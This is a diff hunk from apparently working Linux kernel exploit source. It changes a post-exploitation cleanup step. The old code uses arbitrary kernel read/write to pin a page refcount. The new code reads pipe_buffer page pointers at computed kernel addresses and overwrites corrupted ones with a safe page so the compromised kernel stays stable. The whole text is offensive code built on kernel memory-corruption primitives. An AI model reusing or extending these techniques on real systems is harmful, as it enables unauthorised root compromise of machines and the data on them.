@@ -577,19 +577,29 @@ cleanup:
   }
 
   if (result) {
-#if defined(P0_ORACLE_PROBE_OFFSET)
-    uintptr_t probe_pfn = P0_ORACLE_PROBE_OFFSET >> 12;
-    uintptr_t probe_page = VMEMMAP_START + probe_pfn * STRUCT_PAGE_SIZE;
-    uintptr_t probe_rc_addr = probe_page + 0x34;
-    uint32_t rc = 0;
-    pr_info("root probe pin target PFN=%zx page=%016zx rc_addr=%016zx\n",
-            (size_t)probe_pfn, probe_page, probe_rc_addr);
-    int read_ok = root_read_global(fd, probe_rc_addr, &rc, sizeof(rc));
-    pr_info("root probe pin read=%d rc=%u\n", read_ok, rc);
-    if (read_ok) {
-      uint32_t safe = 256;
-      int write_ok = root_write_global(fd, probe_rc_addr, &safe, sizeof(safe));
-      pr_info("root probe pin write=%d %u->%u\n", write_ok, rc, safe);
+#if defined(P0_ORACLE_PROBE_OFFSET) && defined(P0_ORACLE_GATE_OBJECT_INDEX)
+    uintptr_t safe_page = direct_to_page(pipebuf_page_base);
+    uintptr_t bufs[] = {
+      pipebuf_page_base + P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE,
+      pipebuf_page_base + P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
+          sizeof(struct user_pipe_buffer),
+    };
+    for (size_t i = 0; i < sizeof(bufs) / sizeof(bufs[0]); i++) {
+      uint64_t cur_page = 0;
+      if (!root_read_data(fd, bufs[i], &cur_page, sizeof(cur_page))) {
+        pr_warning("root pipebuf[%zu] read failed addr=%016zx\n", i, bufs[i]);
+        continue;
+      }
+      uintptr_t pfn = (cur_page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
+      uintptr_t phys = pfn << 12;
+      if (phys >= P0_PHYS_OFFSET) {
+        pr_info("root pipebuf[%zu] page=%016llx pfn=%zx phys=%09zx ok\n",
+                i, (unsigned long long)cur_page, pfn, phys);
+        continue;
+      }
+      int w = root_write_data(fd, bufs[i], &safe_page, sizeof(safe_page));
+      pr_info("root pipebuf[%zu] repaired page=%016llx pfn=%zx -> safe=%016zx write=%d\n",
+              i, (unsigned long long)cur_page, pfn, safe_page, w);
     }
 #endif
   }
